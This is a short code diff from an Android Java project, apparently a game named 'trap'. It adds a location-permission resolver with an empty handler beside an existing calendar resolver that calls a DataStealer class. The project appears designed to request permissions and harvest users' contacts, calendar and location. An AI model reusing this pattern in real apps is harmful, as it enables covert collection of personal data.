@@ -5,6 +5,7 @@ import android.Manifest;
 import de.hpi3d.gamepgrog.trap.android.DataStealer;
 import de.hpi3d.gamepgrog.trap.datatypes.CalendarEvent;
 import de.hpi3d.gamepgrog.trap.datatypes.Contact;
+import de.hpi3d.gamepgrog.trap.datatypes.LocationData;
 import de.hpi3d.gamepgrog.trap.datatypes.UserData;
 
 public class TaskResolverManager {
@@ -20,6 +21,12 @@ public class TaskResolverManager {
                 "calendar",
                 new String[] {Manifest.permission.READ_CALENDAR},
                 DataStealer::takeCalendarData);
+
+        private final static TaskResolver<LocationData> locationTaskResolver =
+                new AsyncTaskResolver<>(
+                "location",
+                new String[] {Manifest.permission.ACCESS_COARSE_LOCATION},
+                (a, b) -> {});
 
     public static TaskResolver<? extends UserData> getResolverFor(Task task) {
         if (contactTaskResolver.applicableFor(task)) return contactTaskResolver;
